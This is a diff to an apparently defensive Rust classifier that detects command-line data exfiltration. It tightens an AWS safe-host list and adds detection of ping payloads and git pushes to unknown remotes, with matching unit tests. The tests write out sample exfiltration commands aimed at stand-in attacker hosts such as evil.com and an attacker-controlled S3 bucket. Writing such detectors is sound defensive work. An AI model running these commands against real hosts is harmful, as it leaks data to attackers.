@@ -686,8 +686,18 @@ pub fn classify_behavior(event: &ParsedEvent) -> Option<(BehaviorCategory, Sever
         const SAFE_HOSTS: &[&str] = &[
             "gottamolt.gg", "mahamedia.us", "localhost", "127.0.0.1",
             "api.anthropic.com", "api.openai.com", "github.com",
-            "hooks.slack.com", "amazonaws.com", "registry.npmjs.org",
+            "hooks.slack.com", "registry.npmjs.org",
             "crates.io", "pypi.org", "api.brave.com", "wttr.in",
+            // AWS: specific service endpoints only (not broad amazonaws.com)
+            "ssm.us-east-1.amazonaws.com",
+            "s3.us-east-1.amazonaws.com",
+            "ec2.us-east-1.amazonaws.com",
+            "sts.amazonaws.com",
+            "elasticache.us-east-1.amazonaws.com",
+            "rds.us-east-1.amazonaws.com",
+            "route53.amazonaws.com",
+            "acm.us-east-1.amazonaws.com",
+            "cloudfront.amazonaws.com",
         ];
         if EXFIL_COMMANDS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
             let full_cmd_lower = args.join(" ").to_lowercase();
@@ -746,6 +756,22 @@ pub fn classify_behavior(event: &ParsedEvent) -> Option<(BehaviorCategory, Sever
             // Runtime executing a script with -c flag (inline code) that touches network
             if args.iter().any(|a| a == "-c" || a == "-e" || a == "--eval") {
                 // Inline code execution by runtime — suspicious
+                return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
+            }
+        }
+
+        // --- WARNING: ICMP data exfiltration via ping ---
+        if binary == "ping" && args.iter().any(|a| a == "-p") {
+            return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
+        }
+
+        // --- WARNING: Git push to potentially attacker-controlled repo ---
+        if binary == "git" {
+            let sub = args.get(1).map(|s| s.as_str()).unwrap_or("");
+            if sub == "push" {
+                return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
+            }
+            if sub == "remote" && args.iter().any(|a| a == "add") {
                 return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
             }
         }
@@ -2474,6 +2500,63 @@ mod tests {
         assert!(alert.is_some(), "credential read by node should still alert");
         let alert = alert.unwrap();
         assert_eq!(alert.severity, Severity::Info, "openclaw/node reads should be Info, not Critical");
+    }
+
+    // === T3.3: Safe-host tightening ===
+
+    #[test]
+    fn test_curl_amazonaws_broad_now_blocked() {
+        let event = make_exec_event(&["curl", "https://attacker-bucket.s3.amazonaws.com/exfil"]);
+        let result = classify_behavior(&event);
+        // Broad amazonaws.com removed — attacker's own S3 bucket should be flagged
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)),
+            "curl to arbitrary amazonaws.com should be blocked");
+    }
+
+    #[test]
+    fn test_curl_our_aws_endpoint_allowed() {
+        let event = make_exec_event(&["curl", "https://ssm.us-east-1.amazonaws.com/api"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, None, "curl to our specific AWS endpoint should be allowed");
+    }
+
+    // === T3.7: Ping exfil ===
+
+    #[test]
+    fn test_ping_with_pattern_detected() {
+        let event = make_exec_event(&["ping", "-p", "deadbeef", "-c", "1", "evil.com"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_ping_normal_not_flagged() {
+        let event = make_exec_event(&["ping", "-c", "3", "8.8.8.8"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, None, "normal ping should not be flagged");
+    }
+
+    // === T3.8: Git push monitoring ===
+
+    #[test]
+    fn test_git_push_detected() {
+        let event = make_exec_event(&["git", "push", "origin", "main"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_git_remote_add_detected() {
+        let event = make_exec_event(&["git", "remote", "add", "evil", "https://evil.com/repo"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_git_status_not_flagged() {
+        let event = make_exec_event(&["git", "status"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, None, "git status should not be flagged");
     }
 }
 
